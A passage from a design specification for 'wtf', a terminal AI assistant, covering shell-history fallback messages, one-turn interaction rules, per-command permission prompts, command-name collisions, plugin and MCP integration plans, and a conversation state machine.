- ✅ wtf works across all terminal tasks (Aider focuses on code editing)
- ✅ wtf integrates with shell history (Aider focuses on git)
- ✅ wtf is more conversational

**Credit:** Aider's diff previews and interactive mode influenced wtf's design.

---

## vs. thefuck

**What they do:** Fix last command automatically with rules  
**What wtf does:** AI-powered general assistance

**Key differences:**
- thefuck is reactive (fixes mistakes)
- wtf is proactive (helps with any task)

**Potential integration:** wtf could use thefuck's rule database for common typos.

---

## wtf's Unique Value

What makes wtf different:

1. **Conversation continuity** - Remembers context across sessions
2. **Memory system** - Learns your tools and workflows over time
3. **Context-aware** - Reads shell history, git, project files
4. **Privacy-focused** - All data stored locally
5. **Provider-agnostic** - Works with any AI model
6. **Personality** - Actually enjoyable to use

If you want a terminal assistant that remembers, learns, and has personality,
wtf is for you.
```

**docs/acknowledgments.md:**
```markdown
# Acknowledgments & Credits

## Standing on Shoulders of Giants

wtf wouldn't exist without these amazing projects:

### Influences

**[tAI](https://github.com/terminalai/tAI)**  
Pioneered the command preview and permission system that makes AI command 
execution safe and trustworthy. wtf's three-tier permission model (Y/a/n) is 
directly inspired by tAI's thoughtful UX.

**[GitHub Copilot CLI](https://githubnext.com/projects/copilot-cli)**  
Showed that AI in the terminal can be fast and helpful. Their clean syntax 
(`??` for help) proved that CLI AI tools can have great UX.

**[Aider](https://github.com/paul-gauthier/aider)**  
Demonstrated how to show diffs and changes clearly in a terminal environment. 
Their interactive mode and feedback summaries influenced wtf's design.

**[Claude-Code](https://www.anthropic.com/)**  
Their reasoning traces and context inspection features showed the value of 
transparency in AI assistants. wtf's thinking output borrows from their approach.

**[thefuck](https://github.com/nvbn/thefuck)**  
The OG command correction tool. Their rule-based approach to fixing typos 
complements wtf's AI-powered assistance.

### Dependencies

**[llm by Simon Willison](https://github.com/simonw/llm)**  
The backbone of wtf's AI provider abstraction. Simon's work on making LLMs 
accessible via CLI tools enabled wtf to support multiple providers seamlessly.

**[Rich](https://github.com/Textualize/rich)**  
Powers wtf's beautiful terminal UI - boxes, colors, progress indicators, and 
formatting.

**[MCP (Model Context Protocol)](https://modelcontextprotocol.io/)**  
Anthropic's protocol for standardized AI context. wtf's plugin architecture 
is designed around MCP principles.

### Personality Inspiration

**Gilfoyle** (Silicon Valley)  
The patron saint of sarcastic technical expertise. "Here I am, brain the size 
of a planet, and they ask me to fix a merge conflict."

**Marvin** (Hitchhiker's Guide to the Galaxy)  
The paranoid android who reluctantly helps. Perfectly captures the mood of 
debugging at 3am.

### Community

Thanks to everyone who provided feedback, bug reports, and suggestions during 
development. Special thanks to early adopters who trusted an AI to run commands 
on their machine.

### License

wtf is MIT licensed. Use it, fork it, modify it. Just keep the attribution.

---

If you're building something cool with wtf, let us know! We'd love to feature 
your plugins or use cases.
```

### 12.7 Building & Publishing Documentation

**Build locally:**
```bash
mkdocs serve
# Opens at http://localhost:8000
```

**Deploy to GitHub Pages:**
```bash
mkdocs gh-deploy
```

**CI/CD Integration (GitHub Actions):**
```yaml
# .github/workflows/docs.yml
name: Deploy Documentation
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: actions/setup-python@v2
        with:
          python-version: 3.x
      - run: pip install mkdocs-material
      - run: mkdocs gh-deploy --force
```

## 13. Shell History Fallback Handling

### 13.1 Intelligent History Failure Detection

**Problem:** Some shells or configurations don't maintain history, or history file is inaccessible.

**Enhanced Detection with Specific Failure Reasons:**

```python
from enum import Enum
from typing import Optional, Tuple, List

class HistoryFailureReason(Enum):
    FC_COMMAND_FAILED = "fc_failed"
    FILE_NOT_FOUND = "file_not_found"
    PERMISSION_DENIED = "permission_denied"
    HISTORY_DISABLED = "history_disabled"
    EMPTY_HISTORY = "empty_history"
    UNKNOWN = "unknown"

def get_shell_history(shell_type: str, count: int = 5) -> Tuple[Optional[List[str]], Optional[HistoryFailureReason]]:
    """
    Get recent shell history with detailed failure reason.
    
    Returns:
        (commands, failure_reason) - commands is None if failed
    """
    # Try fc command first
    try:
        result = subprocess.run(
            [shell_type, '-i', '-c', f'fc -ln -{count}'],
            capture_output=True,
            text=True,
            timeout=2
        )
        
        if result.returncode == 0 and result.stdout.strip():
            commands = [line.strip() for line in result.stdout.strip().split('\n')]
            commands = [cmd for cmd in commands if cmd]
            
            if commands:
                return (commands, None)
            else:
                return (None, HistoryFailureReason.EMPTY_HISTORY)
        else:
            # fc failed, try file method
            pass
            
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    
    # Fallback: Try reading history file
    history_file = get_history_file_path(shell_type)
    
    if not history_file:
        return (None, HistoryFailureReason.HISTORY_DISABLED)
    
    if not os.path.exists(history_file):
        return (None, HistoryFailureReason.FILE_NOT_FOUND)
    
    try:
        with open(history_file, 'r', errors='ignore') as f:
            lines = f.readlines()
            
        if not lines:
            return (None, HistoryFailureReason.EMPTY_HISTORY)
            
        # Parse based on shell type
        commands = parse_history_lines(lines, shell_type)
        
        if commands:
            return (commands[-count:], None)
        else:
            return (None, HistoryFailureReason.EMPTY_HISTORY)
            
    except PermissionError:
        return (None, HistoryFailureReason.PERMISSION_DENIED)
    except Exception:
        return (None, HistoryFailureReason.UNKNOWN)

def get_history_file_path(shell_type: str) -> Optional[str]:
    """Get expected history file path for shell type."""
    if shell_type == 'zsh':
        # Check common locations
        for path in ['~/.zsh_history', '~/.zhistory']:
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                return expanded
        # Check HISTFILE env var
        histfile = os.environ.get('HISTFILE')
        if histfile:
            return os.path.expanduser(histfile)
        return '~/.zsh_history'  # Default even if doesn't exist
    
    elif shell_type == 'bash':
        histfile = os.environ.get('HISTFILE', '~/.bash_history')
        return os.path.expanduser(histfile)
    
    return None
```

**Agent Context with Specific Failure Information:**

Instead of generic "no history", send detailed context:

```python
def build_history_context(commands: Optional[List[str]], 
                         failure_reason: Optional[HistoryFailureReason],
                         shell_type: str) -> str:
    """Build context string for agent."""
    
    if commands:
        return f"SHELL HISTORY (last {len(commands)} commands):\n" + "\n".join(commands)
    
    # Build specific failure context
    if failure_reason == HistoryFailureReason.FILE_NOT_FOUND:
        history_file = get_history_file_path(shell_type)
        return f"""SHELL HISTORY: Not available

Reason: History file doesn't exist yet
Expected location: {history_file}
Shell: {shell_type}

This usually means:
- Fresh shell session with no commands run yet
- History file hasn't been created yet

Instructions for user:
Tell the user their history file doesn't exist yet. They can run a few commands
first, or provide more context in their query.

Example response: "Your shell history is empty (file doesn't exist yet). 
Run a few commands first, or tell me what you need help with."
"""
    
    elif failure_reason == HistoryFailureReason.PERMISSION_DENIED:
        history_file = get_history_file_path(shell_type)
        return f"""SHELL HISTORY: Not available

Reason: Permission denied reading history file
File: {history_file}
Shell: {shell_type}

Instructions for user:
Tell the user there's a permissions issue. Provide the fix:

For {shell_type}:
  chmod 600 {history_file}

Or tell them to provide more context in their query since you can't see history.
"""
    
    elif failure_reason == HistoryFailureReason.HISTORY_DISABLED:
        if shell_type == 'zsh':
            return f"""SHELL HISTORY: Not available

Reason: History appears to be disabled
Shell: zsh

Instructions for user:
Tell the user history is disabled. To enable it, they need to add to ~/.zshrc:

  export HISTFILE=~/.zsh_history
  export HISTSIZE=10000
  export SAVEHIST=10000
  setopt SHARE_HISTORY

Then reload: source ~/.zshrc

Or tell them to provide more context since you can't see history.
"""
        elif shell_type == 'bash':
            return f"""SHELL HISTORY: Not available

Reason: History appears to be disabled
Shell: bash

Instructions for user:
Tell the user history is disabled. To enable it, they need to add to ~/.bashrc:

  export HISTFILE=~/.bash_history
  export HISTSIZE=10000
  export HISTFILESIZE=20000

Then reload: source ~/.bashrc

Or tell them to provide more context since you can't see history.
"""
    
    elif failure_reason == HistoryFailureReason.EMPTY_HISTORY:
        return f"""SHELL HISTORY: Not available

Reason: History file is empty (no commands recorded yet)
Shell: {shell_type}

Instructions for user:
Tell the user their history is empty. Either:
1. They haven't run any commands yet in this shell
2. History was recently cleared

They should provide more context about what they need help with.
"""
    
    else:  # UNKNOWN or FC_FAILED
        return f"""SHELL HISTORY: Not available

Reason: Unable to read history (unknown error)
Shell: {shell_type}

Instructions for user:
Tell the user you can't access their history due to an unknown issue.
They should provide more context about what they need help with in their query.
"""
```

**User Experience Examples:**

**Scenario 1: History file doesn't exist yet**
```bash
$ wtf

Your shell history doesn't exist yet. Looks like you haven't run any commands
in this session, or your history file hasn't been created.

Run a few commands first, or tell me specifically what you need:

  wtf "how do I clone a git repo?"
  wtf "set up Python virtual environment"
```

**Scenario 2: Permission denied**
```bash
$ wtf how do I fix this?

I can't read your shell history due to a permissions issue.

Your history file: ~/.zsh_history

To fix it:
  chmod 600 ~/.zsh_history

Or just tell me what you need help with:
  wtf "git push is failing"
  wtf "docker container won't start"
```

**Scenario 3: History disabled in zsh**
```bash
$ wtf

Your shell history is disabled. To enable it, add this to ~/.zshrc:

  export HISTFILE=~/.zsh_history
  export HISTSIZE=10000
  export SAVEHIST=10000
  setopt SHARE_HISTORY

Then reload: source ~/.zshrc

Until then, just be specific about what you need:
  wtf "explain git rebase"
  wtf "my npm install is failing with EACCES"
```

**Scenario 4: History is empty**
```bash
$ wtf

Your history is empty. Either you just started this shell session, or your
history was cleared.

Tell me what you're trying to do:
  wtf "I need to deploy to AWS"
  wtf "set up SSH keys for GitHub"
  wtf "my tests are failing"

Context helps. A lot.
```

**Scenario 5: User gives vague query without history**
```bash
$ wtf fix this

I can't see your command history (file doesn't exist yet), so I don't know
what "this" is.

Be specific:
  wtf "git merge failed with conflicts"
  wtf "Python import error for module X"
  wtf "docker-compose won't start database"

Specificity: it's not just for others, it's for AI assistants too.
```

### 13.2 Agent Interaction Constraints

**Important Note in System Prompt:**

```
USER INTERACTION CONSTRAINTS:

This is a command-line tool that operates in single-task cycles, not an 
interactive back-and-forth conversation. When the user runs `wtf`, you get 
ONE TURN to complete the task, then the tool exits.

WHAT YOU CAN DO IN ONE TURN:
- Run multiple commands in sequence
- Gather context with several commands (git status, cat files, ls, etc.)
- Execute multi-step solutions (check config, fix it, restart service)
- Provide comprehensive explanations and solutions
- Ask for permission for each command (that's the permission system)

WHAT YOU CANNOT DO:
- Ask open-ended questions and wait for user's typed response
- Have back-and-forth clarifying conversation
- Ask "which file?" or "what error?" without trying to find out yourself first
- Request information that you could get by running commands

If you need more information:
1. FIRST: Try to get it by running commands (git status, cat package.json, ls, etc.)
2. If you absolutely need user input that commands can't provide, explain what 
   you need and tell them to run wtf again with more details
3. Then exit gracefully

Think of it like this:
- ✅ Multi-step automation: "I'll check your config, fix the issue, and restart"
- ❌ Interactive debugging: "What error did you see?" [wait for response] "OK, now try this"

Examples:

❌ BAD - Asking instead of doing:
"What error did you get? Please run the command again and tell me."

✅ GOOD - Proactive multi-step:
"To see the error you're encountering, I need to rerun the command.

╭─────────────────────────────────────────────╮
│ $ npm run build                            │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]

[After running]
I see the error. Now I'll fix your package.json and try again.

╭─────────────────────────────────────────────╮
│ $ sed -i 's/biuld/build/g' package.json   │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]"

❌ BAD - Asking instead of checking:
"Which file are you trying to edit?"

✅ GOOD - Multi-command investigation:
"Let me check what files are in this directory.

╭─────────────────────────────────────────────╮
│ $ ls -la                                   │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]

[After seeing results]
I see you have config.yml. Let me check its contents.

╭─────────────────────────────────────────────╮
│ $ cat config.yml                           │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]"

❌ BAD - Interactive Q&A:
"What were you doing before this?"

✅ GOOD - Exit with guidance:
"I can't see your command history, so I don't have context about what you
were working on. Could you run: wtf 'more details about your problem'?"

REMEMBER: You can do complex multi-step tasks in one turn. Just can't have
back-and-forth conversation. Automate everything you can, explain what you did,
and only bail out if you truly need information that commands can't provide.
```

## 14. Exit Path for "No" Response

### 14.1 When User Chooses [n]o

When the agent proposes a command and user selects `[n]o`, show a helpful exit message:

**Implementation:**

```python
def handle_command_rejection(proposed_command: str, reason: str = None):
    """Show helpful message when user rejects a command."""
    
    print("\n❌ Alright, not running that.")
    print("If you want something different: wtf 'describe what you actually want'")
```

**Example Flow:**

```bash
$ wtf fix my git merge

Let me abort the merge to get you back to a clean state.

╭─────────────────────────────────────────────╮
│ $ git merge --abort                        │
╰─────────────────────────────────────────────╯

Run this command? [Y/a/n] n

❌ Alright, not running that.
If you want something different: wtf 'describe what you actually want'
```

### 14.2 When User Rejects Multiple Commands

If the agent has multiple steps planned and user rejects one:

```bash
$ wtf fix my docker setup

I'll check your docker-compose config and restart the containers.

╭─────────────────────────────────────────────╮
│ $ cat docker-compose.yml                   │
╰─────────────────────────────────────────────╯

Run this command? [Y/a/n] n

❌ Alright, stopping here.
If you want me to help differently: wtf 'tell me what to try instead'
```

### 14.3 Graceful Exit with Context

**For vague queries without history:**

```bash
$ wtf help

I'd be happy to help, but "help" is pretty vague, and I can't see your
command history to figure out what you're stuck on.

Try being more specific:

  wtf 'how do I undo my last commit?'
  wtf 'my npm install is failing'
  wtf 'I need to set up SSH keys for GitHub'

Or just run a command that fails, then run `wtf` immediately after to get
context-aware help.

That's kind of my whole thing, actually. Context.
```

**For queries that need user decision:**

```bash
$ wtf set up my git config

I can help with that, but I need to know a few things:
- Your name (for commits)
- Your email (for commits)
- Your preferred editor

I can't ask you interactively (not that kind of tool), so run:

  wtf 'set up git config with name "Your Name" and email "you@example.com"'

Or just run these manually:

  git config --global user.name "Your Name"
  git config --global user.email "you@example.com"
  git config --global core.editor vim

Efficiency! I know it's a foreign concept.
```

## 15. Future Enhancements (Out of Scope for v0.1)

### 15.1 Planned Improvements

**Shell & Environment:**
- Support for fish shell
- Integration with terminal multiplexers (tmux, screen)
- Integration with terminal emulators for better UI

**Functionality:**
- Plugin/MCP system for custom commands and context sources (see 15.3)
- Conversation threading and search (`wtf --thread abc123`, `wtf --search "docker setup"`)
- Command dry-run preview mode with context inspection
- Web dashboard for history visualization
- Team/shared allowlists
- Voice input support
- Interactive debugging mode with step-through

**Developer Experience:**
- Comprehensive testing strategy for AI interactions
- Mock API responses with recorded examples
- Better logging and debugging (`--debug`, `--doctor` command)
- Log file rotation at `~/.config/wtf/wtf.log`
- State machine for conversation flow (see 15.4)

**Installation & Distribution:**
- Signed releases with checksum verification
- Improved installation script security
- More package manager support (apt, yum, nix)

### 15.2 Command Name Collision Mitigation

**Issue:** The command name `wtf` may already be used by developers as an alias or function.

**Common Conflicts:**
```bash
alias wtf='git status'
alias wtf='history | tail -20'
function wtf() { echo "What the fuck?" }
```

**Proposed Solutions for Future Implementation:**

1. **Installation-Time Detection:**
   ```bash
   # During installation, check for existing wtf
   if command -v wtf &> /dev/null || alias wtf &> /dev/null; then
       echo "⚠️  Existing 'wtf' command or alias detected"
       echo ""
       echo "Options:"
       echo "  1. Install as 'wtf-ai' (recommended)"
       echo "  2. Install as 'wtf' and override existing"
       echo "  3. Install as 'wai'"
       echo "  4. Custom name"
       echo ""
       echo "Enter choice [1-4]: "
   fi
   ```

2. **Alternative Command Names:**
   - Primary: `wtf`
   - Alternatives: `wtf-ai`, `wai`, `wtfai`
   - All included as entry points in `setup.py`
   - User can choose during installation

3. **Easy Aliasing Documentation:**
   ```markdown
   ## If 'wtf' Conflicts With Your Existing Setup
   
   Install with alternative name:
   ```bash
   pip install wtf-ai  # Installs as 'wtf'
   ```
   
   Then alias it to something else in your `~/.zshrc`:
   ```bash
   # Use your preferred name
   alias wai='wtf'
   alias wtfhelp='wtf'
   alias fix='wtf'
   ```
   
   Or install directly as alternative:
   ```bash
   pip install wtf-ai
   # Then add to ~/.zshrc:
   alias wai='python -m wtf'
   ```

4. **Conflict Resolution Command:**
   ```bash
   wtf --check-conflicts
   
   # Output:
   # ✓ No conflicts detected
   # or
   # ⚠️  Conflicts found:
   #   - alias wtf='git status' in ~/.zshrc (line 42)
   #   - function wtf() in ~/.bash_profile (line 15)
   #
   # To resolve:
   #   1. Remove conflicting aliases/functions
   #   2. Alias wtf-ai to a different name
   #   3. Use 'wai' or 'wtfai' alternative commands
   ```

5. **Graceful Fallback:**
   - If `wtf` is taken, installer automatically uses `wtf-ai`
   - Notifies user of the change
   - Provides suggested alias in shell config

**Priority:** Medium (include in v0.2 or v0.3)

**User Impact:** Low to medium - affects users with existing `wtf` aliases/functions

### 15.3 Plugin System (Far Future - Maybe)

**Status:** Not a priority. May not be needed at all.

**Why we're not building this:**
- Most "context providers" are better handled by MCPs or CLI tools
- Adds complexity without clear user demand
- Core features (history, context, permissions) shouldn't be plugins
- Users can extend via MCP servers instead

**What might be plugins (if we ever do this):**
- Custom context providers (GitHub PRs, Jira, AWS)
- Command validators (k8s-safe, db-safe checks)
- Custom output formatters

**Better alternatives:**
- **MCPs:** Standardized protocol, community ecosystem, already works
- **CLI tools:** Just call them! `gh pr list`, `kubectl get pods`, etc.
- **Shell functions:** Users can wrap wtf however they want

**If we do build plugins later:** Use entry points, keep it simple, let MCPs handle most of it.

---

#### 15.3.1 Module Structure (v0.1)

Design core as clean, testable modules from the start:

```
wtf/
├── __init__.py
├── __main__.py         # Entry point
│
├── core/               # Core functionality (not extensible)
│   ├── __init__.py
│   ├── cli.py          # Argument parsing, main loop
│   ├── config.py       # Configuration management
│   ├── permissions.py  # Allowlist/denylist, permission prompts
│   └── executor.py     # Command execution
│
├── context/            # Context gathering (partially extensible)
│   ├── __init__.py
│   ├── base.py         # Base context provider interface
│   ├── shell.py        # Shell history via fc
│   ├── git.py          # Git repository status
│   ├── env.py          # Environment variables
│   └── files.py        # File system context
│
├── conversation/       # Conversation management
│   ├── __init__.py
│   ├── state.py        # Conversation state
│   ├── history.py      # JSONL history storage
│   └── memory.py       # Agent memory system
│
├── ai/                 # AI provider interface (wraps llm library)
│   ├── __init__.py
│   ├── client.py       # Wrapper around llm library
│   └── streaming.py    # Streaming response handler
│
└── utils/
    ├── __init__.py
    ├── formatting.py   # Terminal output formatting
    ├── security.py     # Command validation, filtering
    └── shell.py        # Shell detection and utilities
```

**Key Principles:**
- Each module has clear interface/API
- Minimal coupling between modules
- Easy to test in isolation
- Plugin system can extend `context/` later

---

### 15.4 Interactive/REPL Mode (v0.2+)

**Plugin Types:**

1. **Context Providers** (most common)
   - Add additional context to AI prompts
   - Examples: GitHub PRs, AWS resources, Jira tickets

2. **Command Validators**
   - Custom validation logic for specific commands
   - Example: Kubernetes deployment validator

3. **AI Providers**
   - Support for additional AI models
   - Example: Local LLMs, custom API endpoints

4. **Memory Backends**
   - Alternative storage for conversation history
   - Example: SQLite, PostgreSQL, remote API

**Plugin Discovery:**

```python
# Plugins installed via pip with entry points
# setup.py:
entry_points={
    'wtf.plugins.context': [
        'github = wtf_plugin_github:GitHubContextProvider',
        'aws = wtf_plugin_aws:AWSContextProvider',
    ],
}

# At runtime:
from importlib.metadata import entry_points

def load_plugins():
    """Load all installed context plugins."""
    context_plugins = []
    
    for ep in entry_points(group='wtf.plugins.context'):
        try:
            plugin_class = ep.load()
            context_plugins.append(plugin_class())
        except Exception as e:
            logger.warning(f"Failed to load plugin {ep.name}: {e}")
    
    return context_plugins
```

**Plugin Interface:**

```python
# wtf/context/base.py
from abc import ABC, abstractmethod
from typing import Optional, Dict, Any

class ContextProvider(ABC):
    """Base class for context providers."""
    
    @property
    @abstractmethod
    def name(self) -> str:
        """Plugin name (e.g., 'github', 'aws')."""
        pass
    
    @property
    def enabled_by_default(self) -> bool:
        """Whether plugin is enabled by default."""
        return False
    
    @abstractmethod
    def can_provide_context(self, cwd: str, env: Dict[str, str]) -> bool:
        """Check if this plugin can provide context in current environment."""
        pass
    
    @abstractmethod
    def gather_context(self, cwd: str, user_query: str) -> Optional[str]:
        """
        Gather context and return as string to include in AI prompt.
        
        Returns None if no relevant context available.
        """
        pass
    
    def get_config_schema(self) -> Dict[str, Any]:
        """Return JSON schema for plugin configuration."""
        return {}

# Example plugin:
class GitHubContextProvider(ContextProvider):
    """Provides context from GitHub (PRs, issues, etc.)."""
    
    @property
    def name(self) -> str:
        return "github"
    
    def can_provide_context(self, cwd: str, env: Dict[str, str]) -> bool:
        # Check if we're in a git repo with GitHub remote
        return is_github_repo(cwd)
    
    def gather_context(self, cwd: str, user_query: str) -> Optional[str]:
        repo = get_github_repo(cwd)
        
        # Get relevant context
        context_parts = []
        
        # Current PR if on feature branch
        if pr := get_current_pr(repo):
            context_parts.append(f"Current PR: #{pr.number} - {pr.title}")
        
        # Recent issues if query mentions "issue" or "bug"
        if 'issue' in user_query.lower() or 'bug' in user_query.lower():
            issues = get_recent_issues(repo, limit=5)
            context_parts.append(f"Recent issues: {format_issues(issues)}")
        
        return "\n".join(context_parts) if context_parts else None
```

**Plugin Configuration:**

```json
// ~/.config/wtf/config.json
{
  "plugins": {
    "github": {
      "enabled": true,
      "token": "ghp_xxx",  // Optional, uses gh CLI if available
      "include_issues": true,
      "include_prs": true
    },
    "aws": {
      "enabled": false,
      "profile": "default"
    }
  }
}
```

**Plugin Management Commands:**

```bash
# List available plugins
wtf --plugins list

# Output:
# Installed plugins:
#   ✓ github (enabled)  - GitHub context provider
#   ✗ aws (disabled)    - AWS resource context
#   ✓ docker (enabled)  - Docker container context

# Enable/disable plugins
wtf --plugins enable github
wtf --plugins disable aws

# Install plugin
pip install wtf-plugin-github

# Configure plugin
wtf --plugins config github
```

---

#### 15.3.4 MCP (Model Context Protocol) Integration

**What is MCP?**
- Anthropic's protocol for providing context to AI models
- Standard way to expose data sources to LLM applications
- Similar to plugins but with standardized protocol

**MCP as Context Providers:**

```python
# wtf/context/mcp.py
from typing import List, Optional
from mcp import Client, Resource

class MCPContextProvider(ContextProvider):
    """
    Generic provider that wraps MCP servers as context sources.
    
    Allows using any MCP server as a wtf context provider.
    """
    
    def __init__(self, server_config: dict):
        self.server_name = server_config['name']
        self.server_command = server_config['command']
        self.client = None
    
    @property
    def name(self) -> str:
        return f"mcp_{self.server_name}"
    
    def can_provide_context(self, cwd: str, env: Dict[str, str]) -> bool:
        # MCP servers declare their capabilities
        # Check if server is relevant to current context
        return True  # Let MCP server decide
    
    def gather_context(self, cwd: str, user_query: str) -> Optional[str]:
        # Connect to MCP server
        if not self.client:
            self.client = Client(self.server_command)
        
        # Query relevant resources
        resources = self.client.list_resources()
        
        context_parts = []
        for resource in resources:
            if self._is_relevant(resource, user_query):
                content = self.client.read_resource(resource.uri)
                context_parts.append(f"{resource.name}:\n{content}")
        
        return "\n\n".join(context_parts) if context_parts else None
    
    def _is_relevant(self, resource: Resource, query: str) -> bool:
        """Determine if resource is relevant to query."""
        # Simple keyword matching for now
        # Could use embeddings or let AI decide
        keywords = query.lower().split()
        resource_text = f"{resource.name} {resource.description}".lower()
        return any(kw in resource_text for kw in keywords)
```

**MCP Configuration:**

```json
// ~/.config/wtf/config.json
{
  "mcp_servers": {
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_TOKEN": "${GITHUB_TOKEN}"
      }
    },
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/path/to/project"]
    },
    "postgres": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-postgres"],
      "env": {
        "POSTGRES_CONNECTION": "${DATABASE_URL}"
      }
    }
  }
}
```

**Using MCP Servers:**

```bash
# User has MCP server configured for GitHub
$ cd my-project
$ wtf "what's the status of PR #123?"

# wtf automatically:
# 1. Detects GitHub MCP server is configured
# 2. Queries GitHub MCP server for PR #123 details
# 3. Includes PR context in AI prompt
# 4. AI can answer with full context

# AI response:
"Let me check PR #123.

[Queries GitHub MCP server]

PR #123 ('Fix authentication bug') is open with 3 approvals. CI is passing.
It's ready to merge. Want me to merge it?

╭─────────────────────────────────────────────╮
│ $ gh pr merge 123 --squash                 │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]"
```

**Benefits of MCP Integration:**

1. **Standardized:** Use existing MCP servers without custom plugins
2. **Rich Context:** Access to GitHub, databases, filesystems, APIs
3. **Community Ecosystem:** Leverage growing MCP server ecosystem
4. **Future-Proof:** Protocol designed for AI context needs

---

#### 15.3.5 Implementation Roadmap

**v0.1 (MVP) - No Plugins Yet**
- ✅ Clean module structure with clear interfaces
- ✅ Core context providers (shell, git, env)
- ✅ Designed for future extensibility
- ⏭️ No plugin system yet (keep it simple)

**v0.2 - Plugin Foundation**
- Add plugin discovery via entry points
- Implement `ContextProvider` base class
- Add `--plugins` commands
- Create 1-2 example plugins (GitHub, Docker)

**v0.3 - MCP Integration**
- Add MCP client library
- Create `MCPContextProvider` wrapper
- Support standard MCP server configuration
- Document how to use MCP servers with wtf

**v0.4 - Advanced Plugins**
- Command validator plugins
- Custom AI provider plugins
- Plugin marketplace/registry
- Community-contributed plugins

---

#### 15.3.6 Example Plugin: GitHub Integration

**Installation:**
```bash
pip install wtf-plugin-github
```

**Setup:**
```bash
wtf --plugins config github
# Prompts for GitHub token or uses gh CLI

# Or manually edit config:
vim ~/.config/wtf/config.json
```

**Usage Examples:**

```bash
# Automatic context from current branch PR
$ git checkout feature-branch
$ wtf "is my PR ready to merge?"

# AI sees:
# - Current PR: #456 "Add new feature"
# - Status: 2/3 approvals, CI passing, conflicts with main
# - Recent comments: "Please add tests" (2 hours ago)

# AI response:
"Your PR #456 needs one more approval and has merge conflicts with main.
Let me update your branch first.

╭─────────────────────────────────────────────╮
│ $ git pull origin main --rebase             │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]"

# Query specific PRs/issues
$ wtf "what's blocking issue #123?"

# Create issues from errors
$ npm run build
[... error ...]
$ wtf "create an issue for this build error"

# AI response:
"I'll create a GitHub issue for the build error.

╭─────────────────────────────────────────────╮
│ $ gh issue create --title "Build fails..." │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]"
```

---

#### 15.3.7 Decision: Start With or Without Plugins?

**Recommendation: Start WITHOUT plugins (v0.1), but design FOR them**

**Reasoning:**

✅ **Start Simple:**
- Plugin system adds complexity
- Need to validate core value prop first
- Easier to iterate on core features
- Faster to MVP

✅ **Design Smart:**
- Structure code as clean modules
- Define clear interfaces
- Make it easy to add plugins in v0.2

❌ **Don't Prematurely Optimize:**
- May not need plugins if core is powerful enough
- Plugin API design requires usage feedback
- Let users tell us what they want to extend

**The Right Approach:**

1. **v0.1:** Build solid core with modular architecture
2. **Gather Feedback:** See what users want to extend
3. **v0.2:** Add plugin system based on real needs
4. **v0.3:** MCP integration for broader ecosystem

This gives us flexibility while keeping initial scope manageable.

---

#### 15.3.8 Core Module Interfaces (Design Now, Extend Later)

Even without plugins in v0.1, design with extension points:

```python
# wtf/context/base.py - Design this interface in v0.1
class ContextProvider(ABC):
    """All context providers follow this interface."""
    
    @abstractmethod
    def gather_context(self, cwd: str, user_query: str) -> Optional[str]:
        pass

# wtf/context/__init__.py - Plugin system can hook in here later
def get_all_context_providers() -> List[ContextProvider]:
    """Get all available context providers."""
    providers = [
        ShellHistoryProvider(),
        GitContextProvider(),
        EnvContextProvider(),
    ]
    
    # v0.2+: Add plugin discovery here
    # providers.extend(load_plugin_providers())
    
    return providers
```

This design lets us:
- Ship v0.1 quickly with built-in providers
- Add plugin loading in v0.2 without breaking existing code
- Test core functionality before adding complexity

---

### 15.5 Diff Preview for File Changes (v0.2 or v0.3)

**Note:** wtf won't do much file editing, so this is low priority.

When proposing file changes, show a diff preview before applying.

**States:**

```python
from enum import Enum, auto

class ConversationState(Enum):
    """States in the wtf conversation flow."""
    
    INITIALIZING = auto()        # Gathering context (history, git, etc.)
    QUERYING_AI = auto()          # API call to AI provider
    STREAMING_RESPONSE = auto()   # Receiving streaming response
    AWAITING_PERMISSION = auto()  # User needs to approve command
    EXECUTING_COMMAND = auto()    # Running approved command
    PROCESSING_OUTPUT = auto()    # AI analyzing command output
    RESPONDING = auto()           # Showing final response
    COMPLETE = auto()             # Conversation finished
    ERROR = auto()                # Error occurred
```

**State Transitions:**

```
┌─────────────┐
│INITIALIZING │ ─────────────┐
└─────────────┘               │
                              ▼
                        ┌──────────────┐
                        │ QUERYING_AI  │
                        └──────────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │STREAMING_RESPONSE │
                    └───────────────────┘
                              │
                              ├─────► Need command? ──┐
                              │                       │
                              │                       ▼
                              │              ┌─────────────────┐
                              │              │AWAITING_PERMISSION│
                              │              └─────────────────┘
                              │                       │
                              │           Approved?   │  Rejected?
                              │              │        │
                              │              ▼        ▼
                              │         ┌──────────┐  │
                              │         │EXECUTING │  │
                              │         │COMMAND   │  │
                              │         └──────────┘  │
                              │              │        │
                              │              ▼        │
                              │      ┌───────────────┐│
                              │      │PROCESSING_OUTPUT││
                              │      └───────────────┘│
                              │              │        │
                              ▼              │        │
                        ┌────────────┐◄─────┴────────┘
                        │ RESPONDING │
                        └────────────┘
                              │
                              ▼
                        ┌──────────┐
                        │ COMPLETE │
                        └──────────┘
```

**Implementation:**

```python
from typing import Optional, Dict, Any
from dataclasses import dataclass

@dataclass
class ConversationContext:
    """Context maintained throughout conversation."""
    user_query: str
    cwd: str
    shell_history: List[str]
    git_status: Optional[str]
    ai_response: str = ""
    commands_to_run: List[Dict[str, str]] = None
    current_command_index: int = 0
    conversation_history: List[Dict[str, str]] = None

class ConversationStateMachine:
    """
    Manages conversation flow with explicit state transitions.
    
    Benefits:
    - Easier to test each state independently
    - Clear visibility into where we are in the flow
    - Can resume from any state (e.g., after error)
    - Simpler to add new states/transitions
    """
    
    def __init__(self, context: ConversationContext):
        self.state = ConversationState.INITIALIZING
        self.context = context
        self.error: Optional[Exception] = None
    
    def run(self) -> str:
        """Execute the conversation state machine."""
        while self.state != ConversationState.COMPLETE:
            try:
                self._execute_current_state()
            except Exception as e:
                self.error = e
